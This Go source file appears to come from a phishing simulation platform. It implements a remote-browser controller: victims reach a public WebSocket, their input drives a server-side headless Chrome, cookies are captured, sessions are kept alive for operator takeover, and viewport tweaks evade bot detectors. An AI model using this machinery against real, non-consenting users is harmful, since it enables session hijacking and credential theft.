package controller

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/draw"
	"image/jpeg"
	"image/png"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"

	"github.com/gin-gonic/gin"
	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/proto"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/oapi-codegen/nullable"
	"github.com/phishingclub/phishingclub/cache"
	"github.com/phishingclub/phishingclub/data"
	"github.com/phishingclub/phishingclub/database"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/remotebrowser"
	"github.com/phishingclub/phishingclub/repository"
	"github.com/phishingclub/phishingclub/service"
	"github.com/phishingclub/phishingclub/utils"
	"github.com/phishingclub/phishingclub/vo"
)

// activeSession tracks every victim WebSocket session from the moment it connects.
// Pointer identity is used by CompareAndDelete so a newer session's entry
// is never removed by an older session's defer cleanup.
// browserPage is nil until the JS script calls newSession(); once set the session
// can be streamed to an admin via StreamLiveSession.
type activeSession struct {
	cancel          context.CancelFunc
	CampaignID      uuid.UUID
	RecipientID     uuid.UUID
	CRID            uuid.UUID
	CreatedAt       time.Time
	victimConnected atomic.Bool
	// isKeepAlive is set when the JS script calls s.keepAlive(), meaning the
	// browser is parked and available for operator takeover. A revisit from the
	// victim must not cancel this session.
	isKeepAlive atomic.Bool
	// isTest marks sessions created by the test runner (RunByID) so they are
	// excluded from the live session list shown to operators.
	isTest bool
	// browserPage is set (non-nil) only after newSession() is called.
	browserPageMu sync.Mutex
	browserPage   *rod.Page
	// screencast broker: one Chrome screencast per target, ref-counted and shared by
	// the operator viewer and victim streams. Both derive their frames from the same
	// source, so a victim stream looks identical whether or not an operator is watching
	// (no operator-presence leak), and two captures never run on one target.
	scMu      sync.Mutex
	scTargets map[proto.TargetTargetID]*scTarget
}

// scFrame is the latest screencast frame for a target.
type scFrame struct {
	data       []byte
	devW, devH float64
}

// scTarget is one shared, ref-counted screencast keyed by Chrome target.
type scTarget struct {
	refs   int
	cancel context.CancelFunc
	latest atomic.Pointer[scFrame]
}

func (a *activeSession) GetCampaignID() uuid.UUID { return a.CampaignID }
func (a *activeSession) Cancel()                  { a.cancel() }
func (a *activeSession) IsKeepAlive() bool        { return a.isKeepAlive.Load() }

func (a *activeSession) getBrowserPage() *rod.Page {
	a.browserPageMu.Lock()
	defer a.browserPageMu.Unlock()
	return a.browserPage
}

func (a *activeSession) setBrowserPage(page *rod.Page) {
	a.browserPageMu.Lock()
	defer a.browserPageMu.Unlock()
	a.browserPage = page
}

// scAcquire ensures a single screencast is running on page's target and registers
// interest in it. get returns the latest frame (nil until the first arrives); release
// drops interest and stops the screencast when the last consumer leaves. Fixed params
// (native-resolution ceiling, quality 90) so every consumer sees identical frames
// regardless of who else is watching — this is what keeps a victim stream invariant to
// operator presence.
func (a *activeSession) scAcquire(page *rod.Page) (get func() *scFrame, release func()) {
	tid := page.TargetID
	a.scMu.Lock()
	if a.scTargets == nil {
		a.scTargets = map[proto.TargetTargetID]*scTarget{}
	}
	t := a.scTargets[tid]
	if t == nil {
		ctx, cancel := context.WithCancel(page.GetContext())
		t = &scTarget{cancel: cancel}
		a.scTargets[tid] = t
		go a.runScreencast(ctx, page, t)
	}
	t.refs++
	a.scMu.Unlock()

	get = func() *scFrame { return t.latest.Load() }
	var once sync.Once
	release = func() {
		once.Do(func() {
			a.scMu.Lock()
			t.refs--
			if t.refs <= 0 {
				t.cancel()
				delete(a.scTargets, tid)
			}
			a.scMu.Unlock()
		})
	}
	return get, release
}

// runScreencast drives one Chrome screencast, storing the latest frame until ctx is
// cancelled by the last release.
func (a *activeSession) runScreencast(ctx context.Context, page *rod.Page, t *scTarget) {
	p := page.Context(ctx)
	wait := p.EachEvent(func(e *proto.PageScreencastFrame) bool {
		// Ack immediately so Chrome keeps producing regardless of consumer speed.
		proto.PageScreencastFrameAck{SessionID: e.SessionID}.Call(p) //nolint:errcheck
		var dw, dh float64
		if e.Metadata != nil {
			dw, dh = e.Metadata.DeviceWidth, e.Metadata.DeviceHeight
		}
		t.latest.Store(&scFrame{data: e.Data, devW: dw, devH: dh})
		return false
	})
	// Foreground the tab so Chrome doesn't throttle its render pipeline.
	proto.TargetActivateTarget{TargetID: page.TargetID}.Call(page.Browser()) //nolint:errcheck
	q, w, h, n := 90, 3840, 2160, 1
	proto.PageStartScreencast{
		Format:        proto.PageStartScreencastFormatJpeg,
		Quality:       &q,
		MaxWidth:      &w,
		MaxHeight:     &h,
		EveryNthFrame: &n,
	}.Call(p) //nolint:errcheck
	proto.PageBringToFront{}.Call(p) //nolint:errcheck
	// Idle headless pages don't emit screencast frames until Chrome renders; nudge a
	// repaint if no frame has arrived shortly after start.
	go func() {
		tm := time.NewTimer(time.Second)
		defer tm.Stop()
		select {
		case <-ctx.Done():
			return
		case <-tm.C:
		}
		if t.latest.Load() == nil {
			proto.RuntimeEvaluate{Expression: "window.requestAnimationFrame(function(){void 0})"}.Call(p) //nolint:errcheck
		}
	}()
	wait()                                // blocks until ctx cancelled by the last release
	proto.PageStopScreencast{}.Call(page) //nolint:errcheck
}

// streamInfo tracks a named cropped stream started by s.stream(selector, name).
// originX/Y are the element's CSS-pixel top-left corner (for input coord mapping).
// scaleX/Y are JPEG pixels per CSS pixel, computed from the first frame received
// (may differ from 1.0 on HiDPI displays or when the viewport fits within maxWidth/maxHeight).
type streamInfo struct {
	mu      sync.RWMutex
	originX float64
	originY float64
	scaleX  float64
	scaleY  float64
	boxSet  bool // true once the first frame has been processed and scale is known
	cancel  context.CancelFunc
	maxFps  int
	quality int // JPEG re-encode quality for cropped frames (0 = use default 92)
}

func (s *streamInfo) setOrigin(x, y float64) {
	s.mu.Lock()
	s.originX, s.originY = x, y
	s.mu.Unlock()
}

func (s *streamInfo) setScale(sx, sy float64) {
	s.mu.Lock()
	s.scaleX, s.scaleY, s.boxSet = sx, sy, true
	s.mu.Unlock()
}

// getInputCoords maps victim canvas pixel coords (vx, vy) back to CDP CSS pixel coords.
func (s *streamInfo) getInputCoords(vx, vy float64) (float64, float64, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if !s.boxSet || s.scaleX == 0 || s.scaleY == 0 {
		return 0, 0, false
	}
	return s.originX + vx/s.scaleX, s.originY + vy/s.scaleY, true
}

var RemoteBrowserColumnsMap = map[string]string{
	"name":       repository.TableColumn(database.REMOTE_BROWSER_TABLE, "name"),
	"updated_at": repository.TableColumn(database.REMOTE_BROWSER_TABLE, "updated_at"),
	"created_at": repository.TableColumn(database.REMOTE_BROWSER_TABLE, "created_at"),
}

var wsUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true // non-browser client (CLI, curl)
		}
		u, err := url.Parse(origin)
		if err != nil {
			return false
		}
		return u.Host == r.Host
	},
}

func modelConfigToRunnerConfig(c nullable.Nullable[model.RemoteBrowserConfig]) remotebrowser.Config {
	cfg := remotebrowser.DefaultConfig()
	if mc, err := c.Get(); err == nil {
		if mc.Mode == "local" || mc.Mode == "remote" {
			cfg.Mode = mc.Mode
		}
		if cfg.Mode == "remote" {
			cfg.Remote = mc.Remote
		}
		cfg.Proxy = mc.Proxy
		cfg.Headless = mc.Headless
		if mc.Timeout > 0 {
			cfg.Timeout = mc.Timeout
		}
		cfg.Lang = mc.Lang
		cfg.ExtraFlags = mc.ExtraFlags
	}
	return cfg
}

// RemoteBrowserController handles remote browser CRUD and live test runs.
type RemoteBrowserController struct {
	Common
	RemoteBrowserService        *service.RemoteBrowser
	RemoteBrowserRepository     *repository.RemoteBrowser
	CampaignRecipientRepository *repository.CampaignRecipient
	CampaignRepository          *repository.Campaign
	CampaignService             *service.Campaign
	// ExecPath is the server-configured Chrome binary (from config.json).
	ExecPath string
	// Enabled mirrors config.RemoteBrowserServerConfig.Enabled. When false
	// every endpoint returns 404 and the feature is fully unavailable.
	Enabled        bool
	TrustedProxies []string
}

func (m *RemoteBrowserController) isEnabled(g *gin.Context) bool {
	if !m.Enabled {
		g.AbortWithStatus(http.StatusNotFound)
		return false
	}
	return true
}

// Create creates a remote browser script.
func (m *RemoteBrowserController) Create(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	var req model.RemoteBrowser
	if ok := m.handleParseRequest(g, &req); !ok {
		return
	}
	id, err := m.RemoteBrowserService.Create(g.Request.Context(), session, &req)
	if ok := m.handleErrors(g, err); !ok {
		return
	}
	m.Response.OK(g, map[string]string{"id": id.String()})
}

// GetOverview returns a lightweight list of remote browsers.
func (m *RemoteBrowserController) GetOverview(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	queryArgs, ok := m.handleQueryArgs(g)
	if !ok {
		return
	}
	queryArgs.DefaultSortByUpdatedAt()
	queryArgs.RemapOrderBy(RemoteBrowserColumnsMap)
	companyID := companyIDFromRequestQuery(g)

	result, err := m.RemoteBrowserService.GetAllOverview(
		companyID,
		g.Request.Context(),
		session,
		&repository.RemoteBrowserOption{QueryArgs: queryArgs},
	)
	if ok := m.handleErrors(g, err); !ok {
		return
	}
	m.Response.OK(g, result)
}

// GetAll returns full remote browser records with pagination.
func (m *RemoteBrowserController) GetAll(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	queryArgs, ok := m.handleQueryArgs(g)
	if !ok {
		return
	}
	queryArgs.DefaultSortByUpdatedAt()
	queryArgs.RemapOrderBy(RemoteBrowserColumnsMap)
	companyID := companyIDFromRequestQuery(g)

	result, err := m.RemoteBrowserService.GetAll(
		g.Request.Context(),
		session,
		companyID,
		&repository.RemoteBrowserOption{QueryArgs: queryArgs},
	)
	if ok := m.handleErrors(g, err); !ok {
		return
	}
	m.Response.OK(g, result)
}

// GetByID returns a single remote browser.
func (m *RemoteBrowserController) GetByID(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	id, ok := m.handleParseIDParam(g)
	if !ok {
		return
	}
	rb, err := m.RemoteBrowserService.GetByID(g.Request.Context(), session, id, &repository.RemoteBrowserOption{})
	if ok := m.handleErrors(g, err); !ok {
		return
	}
	m.Response.OK(g, rb)
}

// UpdateByID updates a remote browser.
func (m *RemoteBrowserController) UpdateByID(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	id, ok := m.handleParseIDParam(g)
	if !ok {
		return
	}
	var req model.RemoteBrowser
	if ok := m.handleParseRequest(g, &req); !ok {
		return
	}
	err := m.RemoteBrowserService.UpdateByID(g.Request.Context(), session, id, &req)
	if ok := m.handleErrors(g, err); !ok {
		return
	}
	m.Response.OK(g, map[string]string{"message": "Remote browser updated"})
}

// DeleteByID deletes a remote browser.
func (m *RemoteBrowserController) DeleteByID(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	id, ok := m.handleParseIDParam(g)
	if !ok {
		return
	}
	err := m.RemoteBrowserService.DeleteByID(g.Request.Context(), session, id)
	if ok := m.handleErrors(g, err); !ok {
		return
	}
	m.Response.OK(g, map[string]string{"message": "Remote browser deleted"})
}

// RunByID upgrades to WebSocket and executes the saved script, streaming
// RunEvents back in real time. The client may send {"type":"stop"} to abort.
func (m *RemoteBrowserController) RunByID(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	id, ok := m.handleParseIDParam(g)
	if !ok {
		return
	}

	rb, err := m.RemoteBrowserService.GetByID(g.Request.Context(), session, id, &repository.RemoteBrowserOption{})
	if ok := m.handleErrors(g, err); !ok {
		return
	}

	cfg := modelConfigToRunnerConfig(rb.Config)

	conn, err := wsUpgrader.Upgrade(g.Writer, g.Request, nil)
	if err != nil {
		m.Logger.Warnw("websocket upgrade failed", "error", err)
		return
	}
	defer conn.Close()
	conn.SetReadLimit(64 * 1024)

	scriptVal, _ := rb.Script.Get()
	script := scriptVal.String()
	runner := remotebrowser.NewRunner(script, cfg)
	runner.ExecPath = m.ExecPath
	runner.Logger = m.Logger

	ctx, cancel := context.WithCancel(g.Request.Context())
	defer cancel()

	// Register a synthetic activeSession so StreamLiveSession can stream this test run.
	// Key is the script UUID, which won't collide with victim crIDs (campaign-recipient UUIDs).
	sess := &activeSession{
		cancel:    cancel,
		CRID:      *id,
		CreatedAt: time.Now(),
		isTest:    true,
	}
	if prev, hadPrev := m.RemoteBrowserService.SwapSession(id.String(), sess); hadPrev {
		prev.Cancel()
	}
	defer m.RemoteBrowserService.CompareAndDeleteSession(id.String(), sess)

	// Forward BrowserCh into the session so StreamLiveSession sees a non-nil page.
	go func() {
		select {
		case page := <-runner.BrowserCh:
			sess.setBrowserPage(page)
		case <-ctx.Done():
		}
	}()

	// Tell the frontend the session ID to use for View/Control streaming.
	if sessionMsg, err := json.Marshal(map[string]string{"type": "session", "id": id.String()}); err == nil {
		conn.WriteMessage(websocket.TextMessage, sessionMsg) //nolint:errcheck
	}

	// Read loop: route {"type":"stop"} to cancel; {"event":"..","data":{}} to runner.Incoming.
	go func() {
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				cancel()
				return
			}
			var cmd struct {
				Type  string          `json:"type"`
				Event string          `json:"event"`
				Data  json.RawMessage `json:"data"`
			}
			if json.Unmarshal(msg, &cmd) != nil {
				continue
			}
			if cmd.Type == "stop" {
				cancel()
				return
			}
			if cmd.Event != "" {
				var data interface{}
				if len(cmd.Data) > 0 {
					json.Unmarshal(cmd.Data, &data) //nolint:errcheck
				}
				select {
				case runner.Incoming <- remotebrowser.IncomingMsg{Event: cmd.Event, Data: data}:
				default:
				}
			}
		}
	}()

	// Drain StreamCh — test runner doesn't serve cropped streams.
	go func() {
		for range runner.StreamCh {
		}
	}()

	// Run the script in a goroutine; Events channel is closed when done.
	go runner.Run(ctx) //nolint:errcheck

	// Write loop: forward every RunEvent to the WebSocket client.
	for evt := range runner.Events {
		data, err := json.Marshal(evt)
		if err != nil {
			continue
		}
		if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
			return
		}
	}
}

// ServeVictim is the public (no auth) WebSocket endpoint that victims connect to.
// The URL is /<seeded-ws-path>/:crID/:rbID where crID is the campaign recipient ID
// (the tracking token already embedded in the phishing page via {{.rID}}) and rbID
// is the remote browser script to run.
//
// The handler bridges victim WebSocket messages into the runner's Incoming channel and
// forwards runner events back to the victim. When the runner emits a "capture" event
// the cookies are saved as a CampaignEvent so they appear alongside AITM captures.
func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	crID, err := uuid.Parse(g.Param("crID"))
	if err != nil {
		g.AbortWithStatus(http.StatusNotFound)
		return
	}
	rbID, err := uuid.Parse(g.Param("rbID"))
	if err != nil {
		g.AbortWithStatus(http.StatusNotFound)
		return
	}

	// look up campaign recipient to get campaignID / recipientID for capture saving
	cr, err := m.CampaignRecipientRepository.GetByCampaignRecipientID(g.Request.Context(), &crID)
	if err != nil {
		g.AbortWithStatus(http.StatusNotFound)
		return
	}

	// look up remote browser script directly (no admin session on this public endpoint)
	rb, err := m.RemoteBrowserRepository.GetByID(g.Request.Context(), &rbID, &repository.RemoteBrowserOption{})
	if err != nil {
		g.AbortWithStatus(http.StatusNotFound)
		return
	}

	// verify the script belongs to the same company as the
	// campaign. A script with no company (nil) is global and usable by any campaign.
	if rbCompany, err := rb.CompanyID.Get(); err == nil {
		cid, cidErr := cr.CampaignID.Get()
		if cidErr != nil {
			g.AbortWithStatus(http.StatusNotFound)
			return
		}
		campaign, campErr := m.CampaignRepository.GetByID(g.Request.Context(), &cid, &repository.CampaignOption{})
		if campErr != nil {
			g.AbortWithStatus(http.StatusNotFound)
			return
		}
		campCompany, campCompanyErr := campaign.CompanyID.Get()
		if campCompanyErr != nil || campCompany != rbCompany {
			g.AbortWithStatus(http.StatusNotFound)
			return
		}
	}

	cfg := modelConfigToRunnerConfig(rb.Config)

	conn, err := wsUpgrader.Upgrade(g.Writer, g.Request, nil)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetReadLimit(64 * 1024)

	var connMu sync.Mutex

	scriptVal, _ := rb.Script.Get()
	runner := remotebrowser.NewRunner(scriptVal.String(), cfg)
	runner.ExecPath = m.ExecPath
	runner.Logger = m.Logger

	campaignID, err1 := cr.CampaignID.Get()
	recipientID, err2 := cr.RecipientID.Get()
	if err1 != nil || err2 != nil {
		g.AbortWithStatus(http.StatusInternalServerError)
		return
	}

	// Use a background context for the runner so the victim's HTTP connection
	// closing (which cancels g.Request.Context()) does not kill a keepAlive
	// session. The session lifetime is controlled explicitly via cancel().
	ctx, cancel := context.WithCancel(context.Background())
	sess := &activeSession{
		cancel:      cancel,
		CampaignID:  campaignID,
		RecipientID: recipientID,
		CRID:        crID,
		CreatedAt:   time.Now(),
	}
	sess.victimConnected.Store(true)

	// One active session per campaign recipient — cancel any previous one.
	// Exception: if the previous session is in keepAlive state the script has
	// parked and is waiting for operator takeover; cancelling it would destroy
	// a live browser the operator may be about to use. In that case put the
	// old session back and drop the new connection instead.
	crIDStr := crID.String()
	if prev, hadPrev := m.RemoteBrowserService.SwapSession(crIDStr, sess); hadPrev {
		if prev.IsKeepAlive() {
			m.RemoteBrowserService.StoreSession(crIDStr, prev)
			cancel()
			return
		}
		prev.Cancel()
	}
	defer func() {
		// For keepAlive sessions the runner is still parked waiting for the
		// operator — do not cancel or remove it here. CloseLiveSession handles
		// cleanup when the operator explicitly ends the session.
		if !sess.isKeepAlive.Load() {
			m.RemoteBrowserService.CompareAndDeleteSession(crIDStr, sess)
			cancel()
		}
	}()

	var activeNamedStreams sync.Map // name → *streamInfo

	// victimVP stores the victim's viewport size sent on connect.
	// Stored as int64 atomics so they can be read from the BrowserCh goroutine
	// without a mutex; 0 means "not yet received".
	var vpWidth, vpHeight atomic.Int64
	var vpScreenW, vpScreenH atomic.Int64 // recipient screen.width/height; 0 means "not yet received"

	// applyViewport sets the emulated viewport on the rod page if we have both a page
	// and a non-zero victim viewport. DeviceScaleFactor is pinned to 1: a value != 1
	// makes Chrome compute mouse movementX/movementY in a scaled space, so
	// movementX != clientX - prevClientX for CDP-injected events, which detectors flag
	// as a CDP mouse leak. Rendering at DSF 1 is slightly softer on HiDPI but keeps the
	// injected mouse coordinates internally consistent.
	applyViewport := func(page *rod.Page) {
		w := vpWidth.Load()
		h := vpHeight.Load()
		if w <= 0 || h <= 0 || page == nil {
			return
		}
		// Mirror the recipient's real screen so screen.width/height stays consistent
		// with the emulated viewport. Without a screen override the viewport
		// (innerWidth/Height) exceeds the headless window's default 800x600 screen,
		// which detectors flag as impossible. Fall back to the viewport size when the
		// recipient did not report a screen, which still keeps screen >= viewport.
		sw := int(vpScreenW.Load())
		if sw < int(w) {
			sw = int(w)
		}
		sh := int(vpScreenH.Load())
		if sh < int(h) {
			sh = int(h)
		}
		proto.EmulationSetDeviceMetricsOverride{
			Width: int(w), Height: int(h), DeviceScaleFactor: 1,
			ScreenWidth: &sw, ScreenHeight: &sh,
		}.Call(page) //nolint:errcheck
	}

	// Read loop: forward victim events into the runner; route stream_input with coord offset.
	go func() {
		// Per-stream last mousemove dispatch time used to cap stream_input mousemove
		// events at 60 Hz. Clicks and other actions are always forwarded immediately.
		streamMouseMoveLast := map[string]time.Time{}
		const streamMouseMoveMinInterval = 16 * time.Millisecond

		// Paste is the only recipient input carrying a payload, and it is the only
		// one whose cost in the browser scales with its size. In remote mode one
		// browser serves every session, so an unbounded paste loop from a single
		// recipient would degrade all of them. Bound both size and rate: an address
		// or a password never comes close to the cap.
		var streamPasteLast time.Time
		const streamPasteMaxLen = 4096
		const streamPasteMinInterval = 200 * time.Millisecond

		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				sess.victimConnected.Store(false)
				select {
				case runner.Incoming <- remotebrowser.IncomingMsg{Event: "disconnect"}:
				default:
				}
				// keepAlive: browser is parked for operator takeover — a victim
				// disconnect must not kill the session, the operator still needs it.
				if !sess.isKeepAlive.Load() {
					cancel()
				}
				return
			}
			var cmd struct {
				Type         string          `json:"type"`
				Event        string          `json:"event"`
				Data         json.RawMessage `json:"data"`
				Name         string          `json:"name"`
				Action       string          `json:"action"`
				X            float64         `json:"x"`
				Y            float64         `json:"y"`
				Button       string          `json:"button"`
				DeltaX       float64         `json:"deltaX"`
				DeltaY       float64         `json:"deltaY"`
				Key          string          `json:"key"`
				Code         string          `json:"code"`
				KeyCode      int64           `json:"keyCode"`
				Modifiers    int64           `json:"modifiers"`
				CharText     string          `json:"charText"`
				Text         string          `json:"text"`
				Width        float64         `json:"width"`
				Height       float64         `json:"height"`
				Dpr          float64         `json:"dpr"`
				ScreenWidth  float64         `json:"screenWidth"`
				ScreenHeight float64         `json:"screenHeight"`
			}
			if json.Unmarshal(msg, &cmd) != nil {
				continue
			}
			if cmd.Type == "viewport" && cmd.Width > 0 && cmd.Height > 0 {
				vpWidth.Store(int64(cmd.Width))
				vpHeight.Store(int64(cmd.Height))
				if cmd.ScreenWidth > 0 && cmd.ScreenHeight > 0 {
					vpScreenW.Store(int64(cmd.ScreenWidth))
					vpScreenH.Store(int64(cmd.ScreenHeight))
				}
				applyViewport(sess.getBrowserPage())
				continue
			}
			if cmd.Type == "stream_input" && cmd.Name != "" && cmd.Action != "" {
				// Rate-limit mousemove to 60 Hz - the captcha screencast frame rate
				// is typically well below this, so extra events never make it into
				// a frame and only add unnecessary CDP round-trips.
				if cmd.Action == "mousemove" {
					now := time.Now()
					if now.Sub(streamMouseMoveLast[cmd.Name]) < streamMouseMoveMinInterval {
						continue
					}
					streamMouseMoveLast[cmd.Name] = now
				}
				if val, exists := activeNamedStreams.Load(cmd.Name); exists {
					si := val.(*streamInfo)
					// Paste carries text, not a position, so it must not go through
					// the coordinate mapping below, which drops the event whenever the
					// stream box is not measured yet.
					if cmd.Action == "paste" {
						now := time.Now()
						if cmd.Text == "" || now.Sub(streamPasteLast) < streamPasteMinInterval {
							continue
						}
						streamPasteLast = now
						text := cmd.Text
						if len(text) > streamPasteMaxLen {
							// Cut back to a rune boundary so a multi byte character
							// split by the cap does not reach Chrome as broken UTF-8.
							text = text[:streamPasteMaxLen]
							for len(text) > 0 && !utf8.ValidString(text) {
								text = text[:len(text)-1]
							}
						}
						if page := sess.getBrowserPage(); page != nil {
							payload, _ := json.Marshal(map[string]interface{}{
								"type": "paste",
								"text": text,
							})
							m.dispatchInput(page, payload)
						}
						continue
					}
					// cmd.X/Y are in cropped-canvas JPEG pixels; map back to CDP CSS coords.
					cdpX, cdpY, ok := si.getInputCoords(cmd.X, cmd.Y)
					if ok {
						if page := sess.getBrowserPage(); page != nil {
							adjusted, _ := json.Marshal(map[string]interface{}{
								"type":      cmd.Action,
								"x":         cdpX,
								"y":         cdpY,
								"button":    cmd.Button,
								"deltaX":    cmd.DeltaX,
								"deltaY":    cmd.DeltaY,
								"key":       cmd.Key,
								"code":      cmd.Code,
								"keyCode":   cmd.KeyCode,
								"modifiers": cmd.Modifiers,
								"charText":  cmd.CharText,
							})
							m.dispatchInput(page, adjusted)
						}
					}
				}
				continue
			}
			if cmd.Event == "" {
				continue
			}
			var eventData interface{}
			json.Unmarshal(cmd.Data, &eventData) //nolint:errcheck
			select {
			case runner.Incoming <- remotebrowser.IncomingMsg{Event: cmd.Event, Data: eventData}:
			default:
			}
		}
	}()

	go runner.Run(ctx) //nolint:errcheck

	// As soon as the browser spawns, mark the session as streamable, apply the
	// victim viewport, and subscribe to navigation events so the script can react
	// via s.on("navigate", fn).
	go func() {
		select {
		case <-ctx.Done():
		case page := <-runner.BrowserCh:
			sess.setBrowserPage(page)
			applyViewport(page)
			wait := page.EachEvent(
				func(e *proto.PageFrameNavigated) (stop bool) {
					if e.Frame != nil && e.Frame.ParentID == "" {
						select {
						case runner.Incoming <- remotebrowser.IncomingMsg{Event: "navigate", Data: map[string]string{"url": e.Frame.URL}}:
						default:
						}
					}
					return
				},
				func(e *proto.PageNavigatedWithinDocument) (stop bool) {
					select {
					case runner.Incoming <- remotebrowser.IncomingMsg{Event: "navigate", Data: map[string]string{"url": e.URL}}:
					default:
					}
					return
				},
			)
			go wait()
		}
	}()

	// Watch for s.stream(selector, name) / stop() calls from the script.
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case cmd, ok := <-runner.StreamCh:
				if !ok {
					return
				}
				if cmd.Op == "start" {
					if val, exists := activeNamedStreams.LoadAndDelete(cmd.Name); exists {
						val.(*streamInfo).cancel()
					}
					streamCtx, streamCancel := context.WithCancel(cmd.Page.GetContext())
					si := &streamInfo{cancel: streamCancel, maxFps: cmd.MaxFps, quality: cmd.Quality}
					activeNamedStreams.Store(cmd.Name, si)
					go m.runNamedStream(streamCtx, cmd.Page, sess, &connMu, conn, cmd.Selector, cmd.Name, si)
				} else if cmd.Op == "stop" {
					if val, exists := activeNamedStreams.LoadAndDelete(cmd.Name); exists {
						val.(*streamInfo).cancel()
					}
				}
			}
		}
	}()

	clientIP := utils.ExtractClientIP(g.Request, m.TrustedProxies)
	userAgent := g.Request.UserAgent()

	// processEvent handles server-side effects for a RunEvent (DB writes, session state
	// updates). Uses context.Background() so a victim disconnect does not cause DB writes
	// to fail mid-flight.
	processEvent := func(evt remotebrowser.RunEvent) {
		switch evt.Type {
		case "capture":
			m.saveCaptureEvent(context.Background(), g.Request, &campaignID, &recipientID, evt.Value, clientIP, userAgent)
		case "submit":
			m.saveSubmitEvent(context.Background(), g.Request, &campaignID, &recipientID, evt.Value, clientIP, userAgent)
		case "error":
			m.saveInfoEvent(context.Background(), &campaignID, &recipientID, evt.Message, clientIP, userAgent)
		case "info":
			m.saveInfoEvent(context.Background(), &campaignID, &recipientID, evt.Message, clientIP, userAgent)
		case "keep_alive":
			sess.isKeepAlive.Store(true)
			select {
			case page := <-runner.LiveCh:
				sess.setBrowserPage(page)
				m.saveInfoEvent(context.Background(), &campaignID, &recipientID, "remote browser session available for takeover", clientIP, userAgent)
			default:
			}
		case "log":
			m.Logger.Debugw(evt.Message, "campaign_id", campaignID, "recipient_id", recipientID)
		}
	}

	// Write loop: forward script events back to the victim page and handle server-side
	// effects. Uses a select so it exits when the victim's HTTP connection closes without
	// cancelling the runner (which must stay alive for keepAlive sessions).
	// On disconnect, drain any buffered events so a keep_alive arriving simultaneously
	// with the disconnect is not silently lost.
	reqCtx := g.Request.Context()
	for {
		select {
		case <-reqCtx.Done():
			// Victim disconnected. Non-blocking drain of buffered events to catch
			// a keep_alive or capture that arrived at the same time as the disconnect.
			for {
				select {
				case evt, ok := <-runner.Events:
					if !ok {
						return
					}
					processEvent(evt)
				default:
					return
				}
			}
		case evt, ok := <-runner.Events:
			if !ok {
				return
			}
			processEvent(evt)
			if evt.Type == "log" || evt.Type == "capture" || evt.Type == "submit" ||
				evt.Type == "keep_alive" || evt.Type == "info" || evt.Type == "error" ||
				evt.Type == "screenshot" || evt.Type == "dom_dump" {
				continue
			}
			payload, err := json.Marshal(map[string]interface{}{
				"type":  evt.Type,
				"key":   evt.Key,
				"value": evt.Value,
			})
			if err != nil {
				continue
			}
			connMu.Lock()
			writeErr := conn.WriteMessage(websocket.TextMessage, payload)
			connMu.Unlock()
			if writeErr != nil {
				return
			}
		}
	}
}

// liveSessionInfo is the JSON shape returned by the live session list/get endpoints.
type liveSessionInfo struct {
	CRID            string    `json:"crID"`
	CampaignID      string    `json:"campaignID"`
	RecipientID     string    `json:"recipientID"`
	CreatedAt       time.Time `json:"createdAt"`
	VictimConnected bool      `json:"victimConnected"`
	CanStream       bool      `json:"canStream"` // true once newSession() has spawned a browser
}

func (m *RemoteBrowserController) sessionToInfo(sess *activeSession) liveSessionInfo {
	return liveSessionInfo{
		CRID:            sess.CRID.String(),
		CampaignID:      sess.CampaignID.String(),
		RecipientID:     sess.RecipientID.String(),
		CreatedAt:       sess.CreatedAt,
		VictimConnected: sess.victimConnected.Load(),
		CanStream:       sess.getBrowserPage() != nil,
	}
}

// ListLiveSessions returns all active victim sessions for the campaign, optionally
// filtered by campaignID query param.
func (m *RemoteBrowserController) ListLiveSessions(g *gin.Context) {
	if !m.isEnabled(g) {
		return
	}
	session, _, ok := m.handleSession(g)
	if !ok {
		return
	}
	if authorized, err := service.IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL); err != nil || !authorized {
		if err != nil {
			m.Logger.Warnw("IsAuthorized error in ListLiveSessions", "error", err)
		}
		m.Response.Forbidden(g)
		return
	}
	campaignFilter := g.Query("campaignID")
	// a live victim session shows the named recipient interacting in real time, which
	// would defeat an anonymous campaign, so those sessions are never listed. cache
	// per campaign; fail closed by hiding a session whose anonymity cannot be checked.
	anonCache := map[string]bool{}
	isCampaignAnon := func(cid string) bool {
		if v, ok := anonCache[cid]; ok {
			return v
		}
		id, err := uuid.Parse(cid)
		if err != nil {
			anonCache[cid] = true
			return true
		}
		anon, err := m.CampaignRepository.IsAnonymousByID(g.Request.Context(), &id)
		if err != nil {
			m.Logger.Warnw("failed to check campaign anonymity for live session list", "error", err)
			anon = true
		}
		anonCache[cid] = anon
		return anon
	}
	var sessions []liveSessionInfo
	m.RemoteBrowserService.RangeSessions(func(_ string, val service.LiveSession) bool {
		sess := val.(*activeSession)
		if sess.isTest {
			return true
		}
		if campaignFilter != "" && sess.CampaignID.String() != campaignFilter {
			return true
		}
		if isCampaignAnon(sess.CampaignID.String()) {
			return true
		}
